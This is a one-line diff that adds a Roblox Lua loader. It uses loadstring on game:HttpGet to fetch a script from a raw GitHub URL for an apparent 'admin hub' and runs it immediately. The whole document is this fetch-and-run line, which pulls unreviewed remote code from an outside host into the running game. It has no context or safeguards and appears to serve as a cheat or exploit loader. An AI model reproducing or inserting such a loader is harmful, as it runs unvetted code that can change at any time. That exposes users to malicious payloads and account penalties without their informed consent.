@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PureMids/adminhub/main/main.lua", true))()
